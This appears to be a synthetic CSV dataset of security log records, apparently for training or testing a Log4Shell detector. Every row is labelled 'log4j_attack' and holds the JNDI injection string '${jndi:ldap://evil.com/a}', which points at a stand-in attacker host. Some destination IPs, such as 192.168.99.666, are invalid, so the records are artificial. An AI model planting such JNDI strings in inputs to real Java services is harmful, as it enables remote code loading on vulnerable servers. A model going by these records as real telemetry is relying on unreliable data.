timestamp,src_ip,dst_ip,process_name,file_hash,signature_status,outbound_conn_5min,dns_query,log_line,jndi_present,entropy,label
2025-11-28T06:19:56.048921,192.168.1.246,185.199.108.33,java.exe,4fbf9c7174f3e5c0ec3f072d9ae5f216306c5299aa465593024b444710150bbe,Valid,44,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.414,log4j_attack
2025-11-28T06:19:56.048936,192.168.1.108,185.199.108.33,java.exe,bb959181d37a9c4259769f548f21cdd9fd74fa0918640a60eab388ab32e69a74,Valid,44,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.444,log4j_attack
2025-11-28T06:19:56.048952,192.168.1.63,104.21.45.67,java.exe,e534c8c06a7662b5f4d2c8dd5a94d20155cf02695f956d523e367a337b1626a1,Valid,66,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.12,log4j_attack
2025-11-28T06:19:56.048969,192.168.1.190,192.168.99.666,java.exe,ad705e3b3012a2e48dea1a49540c3672fb04a335e99a7ea9989491b4122141c1,Valid,47,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.008,log4j_attack
2025-11-28T06:19:56.048986,192.168.1.16,185.45.67.88,java.exe,72babd2f724d99745354adad6ce43ce34cf7b6944f9fd43088bcca17a75c2552,Valid,63,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.089,log4j_attack
2025-11-28T06:19:56.049010,192.168.1.86,45.32.123.99,java.exe,be44acd8e4360259679bf0100668024d591f5101028f2466dbd8a1491de1e3b1,Valid,23,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.271,log4j_attack
2025-11-28T06:19:56.049029,192.168.1.192,185.45.67.88,java.exe,fbc9b5834bbe92acb794caf1752af723500bd8d69a7a89f8a7d13c2327848720,Valid,29,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.943,log4j_attack
2025-11-28T06:19:56.049046,192.168.1.214,185.199.108.33,java.exe,1f65708bb3adde95e276638bb54c60fde6d2a0b7fe1acb70efafaac78c1df12e,Valid,22,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.459,log4j_attack
2025-11-28T06:19:56.049062,192.168.1.44,185.199.108.33,java.exe,0630aea37911dc87d3fb48e82ab0d36b85719c885a043efd05e5049739e1eb48,Valid,24,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.2,log4j_attack
2025-11-28T06:19:56.049077,192.168.1.208,45.32.123.99,java.exe,0cd51baa9b5a12541dd80cfc93342710d045ba0cb29025cd27535d0c4622673b,Valid,32,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.952,log4j_attack
2025-11-28T06:19:56.049092,192.168.1.55,45.32.123.99,java.exe,3de49677cdfd1732d0c5a23ee401ab8434520826b0832ad485832f90cb4417a0,Valid,23,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.125,log4j_attack
2025-11-28T06:19:56.049108,192.168.1.52,104.21.45.67,java.exe,e5098a987fffe6707b76e3918efacf5806c3b06033934514dac8dd86d5e52214,Valid,32,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.006,log4j_attack
2025-11-28T06:19:56.049124,192.168.1.174,45.32.123.99,java.exe,7bf257d9c694f818683cc44012b502ee0bf4c91fa1fe7a27316beea56b0fac99,Valid,63,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.017,log4j_attack
2025-11-28T06:19:56.049139,192.168.1.228,185.199.108.33,java.exe,04bd41189b6ef14d15eb681e026cb1e315a79288dcc50c0e7d1c36b59eadc2fe,Valid,53,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.965,log4j_attack
2025-11-28T06:19:56.049155,192.168.1.67,192.168.99.666,java.exe,88de1daa5908255713ac1be7f91051e70bc17becef0c0c11fde05b9da48f1860,Valid,28,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.459,log4j_attack
2025-11-28T06:19:56.049170,192.168.1.161,185.45.67.88,java.exe,9d19ae3933df07b0651fd8044b92339eb3c5abfe2bc921981d9f26102cafc65a,Valid,24,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.928,log4j_attack
2025-11-28T06:19:56.049187,192.168.1.58,192.168.99.666,java.exe,cb6968e3edad6563bf48afc4c8fda9b668894eef2563524efbc671cdc4b5e48d,Valid,41,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.124,log4j_attack
2025-11-28T06:19:56.049202,192.168.1.189,192.168.99.666,java.exe,53fd3eda18d50c38bc7c9e167085df3315be37d962413144dcabd430d878b93f,Valid,28,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.209,log4j_attack
2025-11-28T06:19:56.049218,192.168.1.63,192.168.99.666,java.exe,8395b641cce58a327e562f5493808d026594324f104975cca3d954a6a217c1f2,Valid,62,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.212,log4j_attack
2025-11-28T06:19:56.049234,192.168.1.188,45.32.123.99,java.exe,12fa85f2cb6e2a9642b815bc974b926eecad425bf9768e9d7474323c9abef619,Valid,23,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.069,log4j_attack
2025-11-28T06:19:56.049249,192.168.1.108,185.45.67.88,java.exe,8be6935dff14e7fa3a4022f8266baadd354eb593719247cbb84e124796b61a9b,Valid,54,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.228,log4j_attack
2025-11-28T06:19:56.049264,192.168.1.113,185.199.108.33,java.exe,66e34131a0bf72ffc927a83e62028389b59931d8a9f8e988f6577bf9dd383810,Valid,53,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.372,log4j_attack
2025-11-28T06:19:56.049280,192.168.1.195,192.168.99.666,java.exe,7b69d040599775b63d78690d65ffbb08d761ac37aa635054840e9673e3c67f09,Valid,56,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.318,log4j_attack
2025-11-28T06:19:56.049296,192.168.1.205,185.199.108.33,java.exe,cc8dd9841cde3ea7b113a402efc6d2b23fc616feb85edb7ccf836468a38bcfb3,Valid,33,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.323,log4j_attack
2025-11-28T06:19:56.049316,192.168.1.128,185.199.108.33,java.exe,2bade7a585c48ca46307da182b8a46dcdb32415f795501a0dfab15b7fe5764dd,Valid,44,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.01,log4j_attack
2025-11-28T06:19:56.049333,192.168.1.32,192.168.99.666,java.exe,b82c06ed73918af7a877f6c4c0c6f17231f72625ca962ab1b1b84ca2405b8afb,Valid,46,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.025,log4j_attack
2025-11-28T06:19:56.049347,192.168.1.109,185.199.108.33,java.exe,b79368bcf353d570a974db20d4348d9b4e55918b3c665c551e96cbf116ccc7fc,Valid,60,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.995,log4j_attack
2025-11-28T06:19:56.049363,192.168.1.82,192.168.99.666,java.exe,548d2867db41584e515327a936df52016bd699d4bb029bdd6b6139f4df9048e2,Valid,32,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.336,log4j_attack
2025-11-28T06:19:56.049378,192.168.1.231,192.168.99.666,java.exe,959f4900b9cac72a49b8d3b740515552fbdc2bafeb77e4255a1141a8a70c1064,Valid,28,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.804,log4j_attack
2025-11-28T06:19:56.049394,192.168.1.171,192.168.99.666,java.exe,eb57adc0437b07373f23a5e4c10b0f86522d03f8ae5a72c3d1377ee85a579e5a,Valid,33,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.913,log4j_attack
2025-11-28T06:19:56.049409,192.168.1.137,185.45.67.88,java.exe,7c3ab311009fc575a48691a139073eb795c5905a9818444bce34018ea8993d6d,Valid,29,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.897,log4j_attack
2025-11-28T06:19:56.049425,192.168.1.34,192.168.99.666,java.exe,aeed1ac33249130597f7551b1040de6e5753c135d847c86749d09a697ad667eb,Valid,40,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.818,log4j_attack
2025-11-28T06:19:56.049440,192.168.1.189,45.32.123.99,java.exe,df48aa464a8c89888afd638701573b2ec61b8d3223f875dedb873ef24cd9132c,Valid,42,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.115,log4j_attack
2025-11-28T06:19:56.049455,192.168.1.219,192.168.99.666,java.exe,88045ccf883460e6ec00cfb5f6aa8cb6282ef4bafc0e7f082b69310ed6c98a07,Valid,67,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.344,log4j_attack
2025-11-28T06:19:56.049471,192.168.1.141,185.45.67.88,java.exe,8489aa9c81e7c3f0f7bcd630e6a01ddc126acd8d6b2b3f52912a81882d01e416,Valid,32,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.832,log4j_attack
2025-11-28T06:19:56.049487,192.168.1.228,192.168.99.666,java.exe,84f1e07447bece8c2220ba4dd2bfc93a9032d6252cf37b2dfee6d88952b133b0,Valid,58,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.876,log4j_attack
2025-11-28T06:19:56.049503,192.168.1.190,192.168.99.666,java.exe,ecff3f1db57ffd13e05291413b85486bdc737d6bb5a615e2e39e394acdccec78,Valid,33,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.01,log4j_attack
2025-11-28T06:19:56.049519,192.168.1.190,45.32.123.99,java.exe,35025075394c9e9aab13932e94a3730f745baab91597cb786fb3aecb33446efe,Valid,61,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.321,log4j_attack
2025-11-28T06:19:56.049534,192.168.1.22,192.168.99.666,java.exe,cde55f03eeb8e635de0169e4c8e8a88a816a67c1ab8a882be5c84cd72d7ddf02,Valid,67,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.049,log4j_attack
2025-11-28T06:19:56.049551,192.168.1.81,185.199.108.33,java.exe,632a7ec36cdd74533017812073ae63f62d1a06e0d16f07081095672a8205a8ca,Valid,42,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.926,log4j_attack
2025-11-28T06:19:56.049567,192.168.1.43,192.168.99.666,java.exe,63766cbec5637d29710d59f0a941ecb865a53be318f9761f201784fc869b932e,Valid,31,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.451,log4j_attack
2025-11-28T06:19:56.049583,192.168.1.27,185.199.108.33,java.exe,c3f8b7916efd91867bfcc92cb40a7da95276c7bb89f3d247c3a5177c7e259c0f,Valid,80,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.888,log4j_attack
2025-11-28T06:19:56.049598,192.168.1.131,185.45.67.88,java.exe,3ac96ef6e84675eb99641678ce70ab304787ff069e4cb0bd8e212728193eba34,Valid,66,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.318,log4j_attack
2025-11-28T06:19:56.049613,192.168.1.74,104.21.45.67,java.exe,9f9c62c719d1cbe473d49bec9c1413b95e9785701b53d583d9d09aa2b6b5487a,Valid,23,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.414,log4j_attack
2025-11-28T06:19:56.049629,192.168.1.186,192.168.99.666,java.exe,fc09f682e1070e39745e755368f10bb961335a190c209b8faeaf37590ef2209d,Valid,53,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.449,log4j_attack
2025-11-28T06:19:56.049644,192.168.1.30,185.45.67.88,java.exe,0e4b881c45bea67505c9e6b7c778a551393e65653d4e0fbe7e00bdfff5fb2f26,Valid,76,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.042,log4j_attack
2025-11-28T06:19:56.049659,192.168.1.100,185.45.67.88,java.exe,8a72d6b266b554173a602270f5fb7df64ecadead93902eaa2112f697d5249d30,Valid,74,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.076,log4j_attack
2025-11-28T06:19:56.049675,192.168.1.194,104.21.45.67,java.exe,5dabdf0f2b2c913a55e97ae49b46c938c9c98c021477762eaef715cab9961219,Valid,48,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.121,log4j_attack
2025-11-28T06:19:56.049690,192.168.1.117,45.32.123.99,java.exe,aba057e6781d3e71c064fcf1fda3963012f3666217805871269d8eab864be150,Valid,34,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.216,log4j_attack
2025-11-28T06:19:56.049705,192.168.1.187,192.168.99.666,java.exe,0564898b9b5b8cb1802ad253efe6502abcd014ca994cce43e5667a99b63e1fa2,Valid,36,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.248,log4j_attack
2025-11-28T06:19:56.049720,192.168.1.187,185.199.108.33,java.exe,7da8f4d849270857d6e1684903606b0593a360d609586fcf5661e960321ffdc1,Valid,41,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.934,log4j_attack
2025-11-28T06:19:56.049735,192.168.1.86,185.45.67.88,java.exe,f70669338bc7000963eb7d7b6d5770d6c6f331044c5fc6c2a8fad788fcad5350,Valid,77,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.922,log4j_attack
2025-11-28T06:19:56.049750,192.168.1.84,104.21.45.67,java.exe,4e354fd98f0f3f532b8c560483e03ab22a01e1fa271a37550be1595ea8d971ab,Valid,31,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.924,log4j_attack
2025-11-28T06:19:56.049765,192.168.1.136,185.199.108.33,java.exe,db056d586b53e15cbfe653e68b0f5b21732fa76ad62e02a5e8fc6ae383ae8eca,Valid,45,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.028,log4j_attack
2025-11-28T06:19:56.049780,192.168.1.184,185.199.108.33,java.exe,a35aad40835b7c90e0b48d1a4125c508862c6e32eb35bcb116958873f7ad7f07,Valid,40,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.91,log4j_attack
2025-11-28T06:19:56.049796,192.168.1.215,185.199.108.33,java.exe,9e270d00b597e80387cf77cfb78c0b61b0f31acdb03a78d606c98c72cb125090,Valid,78,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.457,log4j_attack
2025-11-28T06:19:56.049811,192.168.1.120,185.45.67.88,java.exe,9b1021c8439dbe6a875cacde7b8d6ea846331348489406fdc893f5b8c26e6f17,Valid,69,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.286,log4j_attack
2025-11-28T06:19:56.049826,192.168.1.41,104.21.45.67,java.exe,fbedea1c204f99a9dc260ee9f6a67b8a3ba063aaaf3a44d1079c01207201d8dc,Valid,36,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.225,log4j_attack
2025-11-28T06:19:56.049841,192.168.1.163,192.168.99.666,java.exe,1d7f379170759ca341e1324a08a4dcfe97a33f5bd139cdbd8d9743a997ea1872,Valid,31,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.312,log4j_attack
2025-11-28T06:19:56.049856,192.168.1.119,185.199.108.33,java.exe,b3b07d9445ed66031fc56fa591ff83398445efe4fc91d6ce9e118fdd8c92fa10,Valid,43,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.014,log4j_attack
2025-11-28T06:19:56.049872,192.168.1.89,192.168.99.666,java.exe,44169abe6b0a4b6687d3d25954519cc7b7774b0d0ceeed382a9bed71955a9d12,Valid,46,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.33,log4j_attack
2025-11-28T06:19:56.049900,192.168.1.151,185.199.108.33,java.exe,ea392dbf119e3b996a912879ea24e136b061c4483ea6b664e0330cf72cab475c,Valid,54,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.19,log4j_attack
2025-11-28T06:19:56.049917,192.168.1.52,192.168.99.666,java.exe,c35e61685d394a3f59a2fdbc708d667c4b0161ae635416f9289fe8d393880220,Valid,26,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.828,log4j_attack
2025-11-28T06:19:56.049934,192.168.1.67,185.199.108.33,java.exe,dca8d2c49e676cd409b1376cd36635bbc6b4fca905b65f5ca8c59a8b56bc3558,Valid,27,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.082,log4j_attack
2025-11-28T06:19:56.049950,192.168.1.186,185.199.108.33,java.exe,784e0304c09866df3ec921c237f23181ac9787631f808e284b94cae8d19ddd3a,Valid,20,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.41,log4j_attack
2025-11-28T06:19:56.049965,192.168.1.82,104.21.45.67,java.exe,5443f2fcd3720360adcc1b02d2f92d4ce0784554d75530d46d90a725ece1a6ef,Valid,66,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.887,log4j_attack
2025-11-28T06:19:56.049980,192.168.1.177,185.199.108.33,java.exe,6e9820ea5b46ae7214db03d20263fd495a68094e91397ad27079b050fe88e080,Valid,45,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.425,log4j_attack
2025-11-28T06:19:56.049996,192.168.1.52,104.21.45.67,java.exe,4b575f678b809a2f5ba29bbe03c0bbfadaf64e27539e17e2dce5a916b96bcce9,Valid,52,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.162,log4j_attack
2025-11-28T06:19:56.050011,192.168.1.208,185.199.108.33,java.exe,7000dc79cde9dc8659ce49165621a29f68d13a61075b79c2087708df81f4982f,Valid,29,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.395,log4j_attack
2025-11-28T06:19:56.050026,192.168.1.64,192.168.99.666,java.exe,ed910c9ac662a81ec4f5f751f94a2cebbd251b71cdd3a6cac66d5eebe4ad5ae6,Valid,58,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.419,log4j_attack
2025-11-28T06:19:56.050041,192.168.1.79,104.21.45.67,java.exe,143540e56d4c49cc7fb9cded49331d2c2bcb9e9883bccdc3681f1b3078e80163,Valid,41,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.49,log4j_attack
2025-11-28T06:19:56.050056,192.168.1.237,104.21.45.67,java.exe,f48000fa917a99059ac0f17bcf0bbf8a37611686e5a8393e189ff9867d7e108a,Valid,31,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.38,log4j_attack
2025-11-28T06:19:56.050072,192.168.1.220,185.199.108.33,java.exe,5a53ac5d17b601cc058730405a7bb028359786d5cf2b5523085a8b733d48b9cf,Valid,76,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.433,log4j_attack
2025-11-28T06:19:56.050088,192.168.1.164,104.21.45.67,java.exe,81a6dd2cc4c7cbf2929a75a1890a88024951f549e5095ea8060c4241418e2697,Valid,43,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.343,log4j_attack
2025-11-28T06:19:56.050103,192.168.1.154,104.21.45.67,java.exe,62c0d3543914564a93924e0bb28ecbff6c6d6a7bc431de03078ff44d656bbddb,Valid,34,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.953,log4j_attack
2025-11-28T06:19:56.050120,192.168.1.85,185.45.67.88,java.exe,adbcb1b7cde1eff079c1a45674e278f95c6c223cc6b1b272f2772b60feac967f,Valid,41,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.417,log4j_attack
2025-11-28T06:19:56.050135,192.168.1.111,185.45.67.88,java.exe,ea9a7d4f985de0935cfd6da8d9d4a88cf80cacf8aaef446865b94feeb46a667b,Valid,77,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.293,log4j_attack
2025-11-28T06:19:56.050150,192.168.1.194,185.199.108.33,java.exe,99593869e1325b966c17fb66818899a68b58d4c5f60c9cbdfed7bfb7070aef2d,Valid,31,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.318,log4j_attack
2025-11-28T06:19:56.050165,192.168.1.111,185.45.67.88,java.exe,5966765afed5034b2b99b56b2e1ba47acaf6746043906d4005c6a6340aec4512,Valid,20,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.252,log4j_attack
2025-11-28T06:19:56.050180,192.168.1.11,104.21.45.67,java.exe,872a8a697a6d6ddd4bb005aed6f047896f7ca977047041768252c28a239a4ad0,Valid,28,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.029,log4j_attack
2025-11-28T06:19:56.050195,192.168.1.103,185.199.108.33,java.exe,ac1457d9a2004cd36b3eeeb64effc8d9986dfdf999d48a8849f1b161bd38c454,Valid,56,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.467,log4j_attack
2025-11-28T06:19:56.050211,192.168.1.95,45.32.123.99,java.exe,6425e48c0fb9fee11cec6c2d67bf6a348f19d9e0e5dfc97b5c1fe971dc0612ea,Valid,67,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.453,log4j_attack
2025-11-28T06:19:56.050226,192.168.1.204,185.45.67.88,java.exe,c9344e0f8114bea96a534437651b92eec23cf45493771f2b5ed6c2df4961d669,Valid,36,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.061,log4j_attack
2025-11-28T06:19:56.050241,192.168.1.184,185.199.108.33,java.exe,82bfafe2bd7eb919b2552c256c40d0985f4a92b82f51d640234dc36631f8a0dd,Valid,69,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.937,log4j_attack
2025-11-28T06:19:56.050256,192.168.1.150,185.199.108.33,java.exe,af3af82aada66362bcad0f8e35f22a211e48539b8f8a2bfb8e857a963f8530f2,Valid,78,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.326,log4j_attack
2025-11-28T06:19:56.050271,192.168.1.175,104.21.45.67,java.exe,f9e716539c965778709ce8a6b555255698a2ec04fd3fba1c8f368f28924a4c25,Valid,46,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.874,log4j_attack
2025-11-28T06:19:56.050287,192.168.1.220,185.45.67.88,java.exe,de957cca3f5fc49767bf1437c4dfd73c50970af8de917243d95afddae92d6c06,Valid,38,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.892,log4j_attack
2025-11-28T06:19:56.050302,192.168.1.231,104.21.45.67,java.exe,9ff9f32d10aff00f1801aa8302f2db0ccf2a6062364b78f2a5240938ab243c36,Valid,61,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.852,log4j_attack
2025-11-28T06:19:56.050322,192.168.1.223,185.45.67.88,java.exe,ac902ec60b5982f8952b58fea99c68656ab2e18b9d230a7efeeeab5da26faab3,Valid,76,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.022,log4j_attack
2025-11-28T06:19:56.050337,192.168.1.214,185.45.67.88,java.exe,d5177e675954d417648299ac11602c55743876ee07e72775009f1600e29fb4ee,Valid,48,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.19,log4j_attack
2025-11-28T06:19:56.050353,192.168.1.236,185.199.108.33,java.exe,be8b4ceb6cdcedef5f53dd6be9d2736f0e1586dab62281fa8faff7880993f77b,Valid,24,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.945,log4j_attack
2025-11-28T06:19:56.050369,192.168.1.209,192.168.99.666,java.exe,ca82d43e04dc05d55f2a6404e65c5e5b21f8d23040453c22dfc475cdbcf2ec5a,Valid,58,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.174,log4j_attack
2025-11-28T06:19:56.050384,192.168.1.49,192.168.99.666,java.exe,785337ca8fd078e181c0a6cf92f3d58695d0bf1ba22a768361d043decf65de35,Valid,21,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.802,log4j_attack
2025-11-28T06:19:56.050399,192.168.1.210,192.168.99.666,java.exe,4e6ad07f0f881bc1f037d4a3fc0dbb610d236b50a6c2de71308ea7b50a6f51f1,Valid,44,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.922,log4j_attack
2025-11-28T06:19:56.050414,192.168.1.17,104.21.45.67,java.exe,516a88a3df3361a269d7508d9a38e9ee9b688b944be84314e6de28983e22b39c,Valid,77,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.391,log4j_attack
2025-11-28T06:19:56.050429,192.168.1.19,104.21.45.67,java.exe,e8b5cfd41c6f33c58c70994da248a9e7ce4d3152b3e169391c5e8a02e84dd090,Valid,24,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.903,log4j_attack
2025-11-28T06:19:56.050445,192.168.1.25,185.199.108.33,java.exe,3f36a3735fc1c3780c963f89c91314ffc1ac0dc0b47a6c97c4d6a8e826af384b,Valid,20,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.034,log4j_attack
2025-11-28T06:19:56.050460,192.168.1.171,185.199.108.33,java.exe,0c3a43b1f8cd7f70da2709fe2b858aae55a8aed27e177af5d59284690b218e7b,Valid,70,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.1,log4j_attack
2025-11-28T06:19:56.050475,192.168.1.118,192.168.99.666,java.exe,bef27ee15faf8d8c5fb7336a300d25528da4d270e5630470fffe0627a2c14f54,Valid,27,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.924,log4j_attack
2025-11-28T06:19:56.050490,192.168.1.69,45.32.123.99,java.exe,7ad1201303bd6fb37ee1ec27ef4eb1a194bee704d0289cc7ea00dc98cc7bd5e1,Valid,60,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.462,log4j_attack
2025-11-28T06:19:56.050505,192.168.1.204,104.21.45.67,java.exe,b66fe6d54eb858ddab95b838efec2bbc9c73ca45692d4303001eb427e4af6bd9,Valid,22,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.182,log4j_attack
2025-11-28T06:19:56.050520,192.168.1.165,185.199.108.33,java.exe,b80261ba6e05511a5b7e7789698231164de17ca54bd4342842b855676f572bf9,Valid,45,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.963,log4j_attack
2025-11-28T06:19:56.050538,192.168.1.112,185.45.67.88,java.exe,4eefc028c0728927be99bd2f145c8f4be8b060de8185c473c9e16ccd41e66205,Valid,25,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.311,log4j_attack
2025-11-28T06:19:56.050554,192.168.1.76,185.199.108.33,java.exe,6b08949027b5290035fde36fa0f678cb0dfbe0e598e781ca11c0aa14c08aa9ab,Valid,34,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.063,log4j_attack
2025-11-28T06:19:56.050570,192.168.1.49,185.199.108.33,java.exe,bf95c1f61ed41fd3284b6295ba4fbee80ca3351c4df9279e616dbd87ee659f5d,Valid,36,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.483,log4j_attack
2025-11-28T06:19:56.050585,192.168.1.212,104.21.45.67,java.exe,b1c85b31e07b5244c3e55d604bb084742822f7a16a4e9580696becf898ae85db,Valid,71,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.827,log4j_attack
2025-11-28T06:19:56.050600,192.168.1.60,185.199.108.33,java.exe,0115d846da639b785a4b38cc1ea1ea622809a058f6b3ad06e20272bcdb7c30d6,Valid,39,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.151,log4j_attack
2025-11-28T06:19:56.050615,192.168.1.160,185.199.108.33,java.exe,0209059ebc2bdb4db8dca2e4a144e12621b6a5d9a874402b3d25a2a10a12234b,Valid,44,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.817,log4j_attack
2025-11-28T06:19:56.050631,192.168.1.12,185.199.108.33,java.exe,77ca55f1ad1c2843fae7b703b59c9b9051082f20e2144893d1b2904f5c974aa9,Valid,54,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.309,log4j_attack
2025-11-28T06:19:56.050647,192.168.1.178,104.21.45.67,java.exe,d4473de5c362a73bcabc63770f17b6fbe5c303c2ec01156425235b355d5f471b,Valid,61,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.462,log4j_attack
2025-11-28T06:19:56.050662,192.168.1.66,185.45.67.88,java.exe,21aae83b2f528ae32d563702a61405dbd815565453a986598f343f287e547012,Valid,57,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.992,log4j_attack
